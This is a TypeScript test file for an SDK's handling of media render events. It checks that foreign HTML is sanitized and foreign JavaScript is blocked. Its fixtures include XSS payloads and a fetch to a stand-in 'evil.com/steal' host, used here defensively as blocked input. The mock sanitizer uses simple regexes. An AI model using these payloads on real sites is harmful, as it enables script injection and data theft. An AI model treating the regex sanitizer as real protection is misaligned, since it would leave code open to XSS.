/**
 * Integration tests for RenderMediaEvent security handling
 * 
 * Tests how RenderMediaEvent with security fields flows through the SDK
 * and ensures security information is properly propagated to handlers.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { EventEmitter } from '../../EventEmitter';
import type { RenderMediaEvent, ServerEvent } from '../ServerEvents';
import { serverEventFixtures } from '../../../test/fixtures/protocol-events';

// WebSocket constants for test environment
const WS_OPEN = 1;
const WS_CLOSED = 3;

// Mock content sanitizer for testing
class ContentSanitizer {
  private trustedDomains = ['internal.com', 'trusted.com'];
  
  sanitize(content: string, options: { foreign: boolean; type: string }): string {
    if (!options.foreign) {
      return content;  // Trust internal content
    }
    
    // Simulate sanitization for foreign content
    if (options.type === 'text/html') {
      // Remove script tags
      content = content.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
      // Remove event handlers
      content = content.replace(/\son\w+\s*=\s*"[^"]*"/gi, '');
      content = content.replace(/\son\w+\s*=\s*'[^']*'/gi, '');
      // Add sanitized marker
      return `<!-- SANITIZED -->${content}<!-- END SANITIZED -->`;
    }
    
    if (options.type === 'image/svg+xml') {
      // Remove script elements from SVG
      content = content.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
      return `<!-- SVG SANITIZED -->${content}`;
    }
    
    if (options.type === 'application/javascript') {
      // Never execute foreign JavaScript
      return '// BLOCKED: Foreign JavaScript not allowed';
    }
    
    return content;
  }
  
  isTrusted(url?: string): boolean {
    if (!url) return false;
    
    try {
      const urlObj = new URL(url);
      return this.trustedDomains.some(domain => urlObj.hostname.endsWith(domain));
    } catch {
      return false;
    }
  }
}

describe('RenderMediaEvent Integration with Security', () => {
  let emitter: EventEmitter<Record<string, any>>;
  let sanitizer: ContentSanitizer;

  beforeEach(() => {
    vi.clearAllMocks();
    emitter = new EventEmitter();
    sanitizer = new ContentSanitizer();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('Event Flow with Security Information', () => {
    it('should propagate foreign_content flag through event system', () => {
      // Arrange
      const handler = vi.fn((event: RenderMediaEvent) => {
        return {
          needsSanitization: event.foreign_content,
          source: event.sent_by_class,
          originalContent: event.content
        };
      });

      emitter.on('render_media', handler);

      const foreignEvent: RenderMediaEvent = {
        type: 'render_media',
        session_id: 'test-session',
        role: 'assistant',
        content_type: 'text/html',
        content: '<script>alert("XSS")</script>',
        sent_by_class: 'WebFetcher',
        sent_by_function: 'fetch_html',
        foreign_content: true
      };

      // Act
      emitter.emit('render_media', foreignEvent);

      // Assert
      expect(handler).toHaveBeenCalledWith(foreignEvent);
      const result = handler.mock.results[0].value;
      expect(result.needsSanitization).toBe(true);
      expect(result.source).toBe('WebFetcher');
    });

    it('should handle different security levels in event stream', () => {
      // Arrange
      const events: RenderMediaEvent[] = [];
      const securityDecisions: Array<{ event: RenderMediaEvent; decision: string }> = [];

      emitter.on('render_media', (event: RenderMediaEvent) => {
        events.push(event);
        
        let decision: string;
        if (event.foreign_content) {
          decision = 'SANITIZE';
        } else if (event.content_type === 'application/javascript') {
          decision = 'VALIDATE';
        } else {
          decision = 'RENDER';
        }
        
        securityDecisions.push({ event, decision });
      });

      // Act - Emit various security levels
      emitter.emit('render_media', serverEventFixtures.renderMedia);  // Safe internal
      emitter.emit('render_media', serverEventFixtures.renderMediaForeign);  // Foreign
      emitter.emit('render_media', {
        ...serverEventFixtures.renderMedia,
        content_type: 'application/javascript',
        foreign_content: false
      } as RenderMediaEvent);  // Internal JS

      // Assert
      expect(events).toHaveLength(3);
      expect(securityDecisions).toHaveLength(3);
      
      expect(securityDecisions[0].decision).toBe('RENDER');  // Safe internal
      expect(securityDecisions[1].decision).toBe('SANITIZE');  // Foreign
      expect(securityDecisions[2].decision).toBe('VALIDATE');  // Internal JS
    });
  });

  describe('Content Sanitization Based on Security Fields', () => {
    it('should sanitize foreign HTML content', () => {
      // Arrange
      const renderHandler = vi.fn((event: RenderMediaEvent) => {
        const sanitized = sanitizer.sanitize(event.content, {
          foreign: event.foreign_content,
          type: event.content_type
        });
        
        return { original: event.content, sanitized };
      });

      emitter.on('render_media', renderHandler);

      const foreignHtml: RenderMediaEvent = {
        type: 'render_media',
        session_id: 'sanitize-test',
        role: 'assistant',
        content_type: 'text/html',
        content: '<div onclick="steal()">Click</div><script>evil()</script>',
        sent_by_class: 'ExternalFetcher',
        sent_by_function: 'fetch_external',
        foreign_content: true,
        url: 'https://untrusted.com/page'
      };

      // Act
      emitter.emit('render_media', foreignHtml);

      // Assert
      const result = renderHandler.mock.results[0].value;
      expect(result.original).toContain('<script>');
      expect(result.original).toContain('onclick=');
      
      expect(result.sanitized).not.toContain('<script>');
      expect(result.sanitized).not.toContain('onclick=');
      expect(result.sanitized).toContain('<!-- SANITIZED -->');
    });

    it('should not sanitize internal content unnecessarily', () => {
      // Arrange
      const renderHandler = vi.fn((event: RenderMediaEvent) => {
        const sanitized = sanitizer.sanitize(event.content, {
          foreign: event.foreign_content,
          type: event.content_type
        });
        
        return { original: event.content, sanitized };
      });

      emitter.on('render_media', renderHandler);

      const internalHtml: RenderMediaEvent = {
        type: 'render_media',
        session_id: 'internal-test',
        role: 'assistant',
        content_type: 'text/html',
        content: '<div class="chart" onclick="updateChart()">Update</div>',
        sent_by_class: 'ChartGenerator',
        sent_by_function: 'generate_interactive_chart',
        foreign_content: false  // Internal content
      };

      // Act
      emitter.emit('render_media', internalHtml);

      // Assert
      const result = renderHandler.mock.results[0].value;
      expect(result.sanitized).toBe(result.original);  // No changes
      expect(result.sanitized).toContain('onclick=');  // Preserved
    });

    it('should block foreign JavaScript execution', () => {
      // Arrange
      const executionHandler = vi.fn((event: RenderMediaEvent) => {
        if (event.foreign_content && event.content_type === 'application/javascript') {
          return { execute: false, reason: 'Foreign JavaScript blocked' };
        }
        
        const sanitized = sanitizer.sanitize(event.content, {
          foreign: event.foreign_content,
          type: event.content_type
        });
        
        return { execute: false, sanitized };
      });

      emitter.on('render_media', executionHandler);

      const foreignScript: RenderMediaEvent = {
        type: 'render_media',
        session_id: 'script-test',
        role: 'assistant',
        content_type: 'application/javascript',
        content: 'fetch("https://evil.com/steal").then(r => r.json())',
        sent_by_class: 'ScriptFetcher',
        sent_by_function: 'fetch_script',
        foreign_content: true,
        url: 'https://untrusted-cdn.com/script.js'
      };

      // Act
      emitter.emit('render_media', foreignScript);

      // Assert
      const result = executionHandler.mock.results[0].value;
      expect(result.execute).toBe(false);
      
      if (result.reason) {
        expect(result.reason).toBe('Foreign JavaScript blocked');
      } else {
        expect(result.sanitized).toBe('// BLOCKED: Foreign JavaScript not allowed');
      }
    });
  });

  describe('Security Decision Routing', () => {
    it('should route events to different handlers based on security', () => {
      // Arrange
      const safeHandler = vi.fn();
      const foreignHandler = vi.fn();
      const validationHandler = vi.fn();

      // Security-aware router
      emitter.on('render_media', (event: RenderMediaEvent) => {
        if (event.foreign_content) {
          foreignHandler(event);
        } else if (event.content_type === 'text/html') {
          validationHandler(event);
        } else {
          safeHandler(event);
        }
      });

      // Act - Emit different security contexts
      const safeEvent: RenderMediaEvent = {
        type: 'render_media',
        session_id: 'safe',
        role: 'assistant',
        content_type: 'text/plain',
        content: 'Safe text',
        sent_by_class: 'TextGen',
        sent_by_function: 'generate',
        foreign_content: false
      };

      const foreignEvent: RenderMediaEvent = {
        type: 'render_media',
        session_id: 'foreign',
        role: 'assistant',
        content_type: 'text/html',
        content: '<div>Foreign</div>',
        sent_by_class: 'Fetcher',
        sent_by_function: 'fetch',
        foreign_content: true
      };

      const validateEvent: RenderMediaEvent = {
        type: 'render_media',
        session_id: 'validate',
        role: 'assistant',
        content_type: 'text/html',
        content: '<div>Internal HTML</div>',
        sent_by_class: 'HTMLGen',
        sent_by_function: 'generate',
        foreign_content: false
      };

      emitter.emit('render_media', safeEvent);
      emitter.emit('render_media', foreignEvent);
      emitter.emit('render_media', validateEvent);

      // Assert
      expect(safeHandler).toHaveBeenCalledOnce();
      expect(safeHandler).toHaveBeenCalledWith(safeEvent);
      
      expect(foreignHandler).toHaveBeenCalledOnce();
      expect(foreignHandler).toHaveBeenCalledWith(foreignEvent);
      
      expect(validationHandler).toHaveBeenCalledOnce();
      expect(validationHandler).toHaveBeenCalledWith(validateEvent);
    });

    it('should chain security processors', () => {
      // Arrange
      const processors: Array<(event: RenderMediaEvent) => RenderMediaEvent> = [
        // First: Check foreign content
        (event) => ({
          ...event,
          content: event.foreign_content 
            ? `[FOREIGN WARNING] ${event.content}`
            : event.content
        }),
        // Second: Check content type
        (event) => ({
          ...event,
          content: event.content_type === 'text/html'
            ? `[HTML] ${event.content}`
            : event.content
        }),
        // Third: Add source info
        (event) => ({
          ...event,
          content: `[Source: ${event.sent_by_class}] ${event.content}`
        })
      ];

      const finalHandler = vi.fn();

      emitter.on('render_media', (event: RenderMediaEvent) => {
        let processed = event;
        for (const processor of processors) {
          processed = processor(processed);
        }
        finalHandler(processed);
      });

      const testEvent: RenderMediaEvent = {
        type: 'render_media',
        session_id: 'chain-test',
        role: 'assistant',
        content_type: 'text/html',
        content: '<div>Content</div>',
        sent_by_class: 'WebFetcher',
        sent_by_function: 'fetch',
        foreign_content: true
      };

      // Act
      emitter.emit('render_media', testEvent);

      // Assert
      const processed = finalHandler.mock.calls[0][0];
      expect(processed.content).toContain('[FOREIGN WARNING]');
      expect(processed.content).toContain('[HTML]');
      expect(processed.content).toContain('[Source: WebFetcher]');
      expect(processed.content).toBe('[Source: WebFetcher] [HTML] [FOREIGN WARNING] <div>Content</div>');
    });
  });

  describe('WebSocket Simulation with Security', () => {
    it('should maintain security fields through WebSocket transmission', () => {
      // Arrange
      const mockWs = {
        readyState: WS_OPEN,
        send: vi.fn(),
        onmessage: null as any
      };

      const receivedEvents: RenderMediaEvent[] = [];

      // Simulate receiving events from WebSocket
      const handleMessage = (data: string) => {
        try {
          const event = JSON.parse(data);
          if (event.type === 'render_media') {
            receivedEvents.push(event);
            emitter.emit('render_media', event);
          }
        } catch (error) {
          console.error('Failed to parse message:', error);
        }
      };

      emitter.on('render_media', (event: RenderMediaEvent) => {
        // Verify security fields are present
        expect(event).toHaveProperty('foreign_content');
        expect(event).toHaveProperty('sent_by_class');
        expect(event).toHaveProperty('sent_by_function');
      });

      // Act - Simulate receiving foreign content event
      const foreignEventJson = JSON.stringify(serverEventFixtures.renderMediaForeign);
      handleMessage(foreignEventJson);

      // Act - Simulate receiving safe content event
      const safeEventJson = JSON.stringify(serverEventFixtures.renderMedia);
      handleMessage(safeEventJson);

      // Assert
      expect(receivedEvents).toHaveLength(2);
      
      // Check foreign content event
      expect(receivedEvents[0].foreign_content).toBe(true);
      expect(receivedEvents[0].sent_by_class).toBe('WebScraperTool');
      expect(receivedEvents[0].url).toBe('https://external.com/content');
      
      // Check safe content event
      expect(receivedEvents[1].foreign_content).toBe(false);
      expect(receivedEvents[1].sent_by_class).toBe('VisualizationTool');
    });

    it('should handle malformed events missing security fields', () => {
      // Arrange
      const errorHandler = vi.fn();
      const validHandler = vi.fn();

      const handleIncomingEvent = (data: string) => {
        try {
          const event = JSON.parse(data);
          
          if (event.type === 'render_media') {
            // Validate security fields
            if (!('foreign_content' in event)) {
              errorHandler(new Error('Missing foreign_content field'));
              return;
            }
            
            if (typeof event.foreign_content !== 'boolean') {
              errorHandler(new Error('Invalid foreign_content type'));
              return;
            }
            
            validHandler(event);
          }
        } catch (error) {
          errorHandler(error);
        }
      };

      // Act - Valid event
      const validEvent = JSON.stringify({
        type: 'render_media',
        session_id: 'test',
        role: 'assistant',
        content_type: 'text/html',
        content: 'test',
        sent_by_class: 'Tool',
        sent_by_function: 'func',
        foreign_content: true
      });
      
      handleIncomingEvent(validEvent);

      // Act - Missing foreign_content
      const missingField = JSON.stringify({
        type: 'render_media',
        session_id: 'test',
        role: 'assistant',
        content_type: 'text/html',
        content: 'test',
        sent_by_class: 'Tool',
        sent_by_function: 'func'
        // Missing foreign_content
      });
      
      handleIncomingEvent(missingField);

      // Act - Wrong type for foreign_content
      const wrongType = JSON.stringify({
        type: 'render_media',
        session_id: 'test',
        role: 'assistant',
        content_type: 'text/html',
        content: 'test',
        sent_by_class: 'Tool',
        sent_by_function: 'func',
        foreign_content: 'true'  // String instead of boolean
      });
      
      handleIncomingEvent(wrongType);

      // Assert
      expect(validHandler).toHaveBeenCalledOnce();
      expect(errorHandler).toHaveBeenCalledTimes(2);
      expect(errorHandler.mock.calls[0][0].message).toBe('Missing foreign_content field');
      expect(errorHandler.mock.calls[1][0].message).toBe('Invalid foreign_content type');
    });
  });

  describe('Security Context in Handlers', () => {
    it('should provide security context to render handlers', () => {
      // Arrange
      interface SecurityContext {
        isForeign: boolean;
        source: string;
        function: string;
        contentType: string;
        url?: string;
        requiresSanitization: boolean;
        requiresSandbox: boolean;
      }

      const createSecurityContext = (event: RenderMediaEvent): SecurityContext => {
        return {
          isForeign: event.foreign_content,
          source: event.sent_by_class,
          function: event.sent_by_function,
          contentType: event.content_type,
          url: event.url,
          requiresSanitization: event.foreign_content && 
            ['text/html', 'image/svg+xml'].includes(event.content_type),
          requiresSandbox: event.foreign_content && 
            event.content.includes('<iframe')
        };
      };

      const renderWithSecurity = vi.fn((event: RenderMediaEvent) => {
        const context = createSecurityContext(event);
        
        if (context.requiresSanitization) {
          // Apply sanitization
          return { action: 'SANITIZE', context };
        }
        
        if (context.requiresSandbox) {
          // Apply sandboxing
          return { action: 'SANDBOX', context };
        }
        
        if (!context.isForeign) {
          // Render directly
          return { action: 'RENDER', context };
        }
        
        // Default: validate
        return { action: 'VALIDATE', context };
      });

      emitter.on('render_media', renderWithSecurity);

      // Act - Test different scenarios
      const scenarios = [
        {
          event: serverEventFixtures.renderMediaForeign,
          expectedAction: 'SANITIZE'
        },
        {
          event: serverEventFixtures.renderMedia,
          expectedAction: 'RENDER'
        },
        {
          event: {
            ...serverEventFixtures.renderMedia,
            content_type: 'application/javascript',
            foreign_content: true
          } as RenderMediaEvent,
          expectedAction: 'VALIDATE'
        }
      ];

      scenarios.forEach(scenario => {
        emitter.emit('render_media', scenario.event);
      });

      // Assert
      expect(renderWithSecurity).toHaveBeenCalledTimes(3);
      
      const results = renderWithSecurity.mock.results;
      expect(results[0].value.action).toBe('SANITIZE');
      expect(results[0].value.context.requiresSanitization).toBe(true);
      
      expect(results[1].value.action).toBe('RENDER');
      expect(results[1].value.context.isForeign).toBe(false);
      
      expect(results[2].value.action).toBe('VALIDATE');
      expect(results[2].value.context.isForeign).toBe(true);
    });

    it('should track security decisions for audit', () => {
      // Arrange
      interface SecurityAuditEntry {
        timestamp: number;
        sessionId: string;
        foreign: boolean;
        source: string;
        contentType: string;
        decision: string;
        url?: string;
      }

      const auditLog: SecurityAuditEntry[] = [];

      emitter.on('render_media', (event: RenderMediaEvent) => {
        const decision = event.foreign_content ? 'BLOCKED' : 'ALLOWED';
        
        auditLog.push({
          timestamp: Date.now(),
          sessionId: event.session_id,
          foreign: event.foreign_content,
          source: event.sent_by_class,
          contentType: event.content_type,
          decision,
          url: event.url
        });
      });

      // Act - Process multiple events
      const events = [
        serverEventFixtures.renderMedia,
        serverEventFixtures.renderMediaForeign,
        {
          ...serverEventFixtures.renderMedia,
          session_id: 'audit-3',
          foreign_content: true,
          url: 'https://suspicious.com'
        } as RenderMediaEvent
      ];

      events.forEach(event => {
        emitter.emit('render_media', event);
      });

      // Assert
      expect(auditLog).toHaveLength(3);
      
      expect(auditLog[0].foreign).toBe(false);
      expect(auditLog[0].decision).toBe('ALLOWED');
      
      expect(auditLog[1].foreign).toBe(true);
      expect(auditLog[1].decision).toBe('BLOCKED');
      expect(auditLog[1].url).toBe('https://external.com/content');
      
      expect(auditLog[2].foreign).toBe(true);
      expect(auditLog[2].decision).toBe('BLOCKED');
      expect(auditLog[2].url).toBe('https://suspicious.com');
      
      // Verify audit log has all necessary info
      auditLog.forEach(entry => {
        expect(entry.timestamp).toBeGreaterThan(0);
        expect(entry.sessionId).toBeDefined();
        expect(typeof entry.foreign).toBe('boolean');
        expect(entry.source).toBeDefined();
        expect(entry.contentType).toBeDefined();
        expect(entry.decision).toBeDefined();
      });
    });
  });

  describe('Error Handling with Security', () => {
    it('should handle errors in security processors gracefully', () => {
      // Arrange
      const erroringProcessor = vi.fn((event: RenderMediaEvent) => {
        if (event.foreign_content) {
          throw new Error('Security processor error');
        }
        return event;
      });

      const fallbackHandler = vi.fn();
      const errorLog: Error[] = [];

      emitter.on('render_media', (event: RenderMediaEvent) => {
        try {
          erroringProcessor(event);
        } catch (error) {
          errorLog.push(error as Error);
          // Fallback to safe handling
          fallbackHandler({
            ...event,
            content: '[ERROR: Content blocked due to processing error]'
          });
        }
      });

      // Act
      emitter.emit('render_media', serverEventFixtures.renderMediaForeign);
      emitter.emit('render_media', serverEventFixtures.renderMedia);

      // Assert
      expect(erroringProcessor).toHaveBeenCalledTimes(2);
      expect(errorLog).toHaveLength(1);
      expect(errorLog[0].message).toBe('Security processor error');
      
      expect(fallbackHandler).toHaveBeenCalledOnce();
      const fallbackEvent = fallbackHandler.mock.calls[0][0];
      expect(fallbackEvent.content).toContain('[ERROR: Content blocked');
      expect(fallbackEvent.foreign_content).toBe(true);
    });

    it('should default to safe behavior when security fields are ambiguous', () => {
      // Arrange
      const safetyHandler = vi.fn((event: any) => {
        // If we can't determine safety, treat as foreign
        const isSafe = event.foreign_content === false;
        
        return {
          processed: !isSafe,
          action: isSafe ? 'RENDER' : 'BLOCK'
        };
      });

      // Test with various ambiguous cases
      const ambiguousCases = [
        { foreign_content: undefined },  // Missing
        { foreign_content: null },       // Null
        { foreign_content: 'false' },    // Wrong type
        { foreign_content: 0 },          // Falsy but wrong type
        { foreign_content: false }       // Explicitly safe
      ];

      // Act & Assert
      ambiguousCases.forEach(testCase => {
        const result = safetyHandler({
          ...serverEventFixtures.renderMedia,
          ...testCase
        });
        
        if (testCase.foreign_content === false) {
          expect(result.action).toBe('RENDER');
        } else {
          expect(result.action).toBe('BLOCK');  // Default to safe
        }
      });
    });
  });
});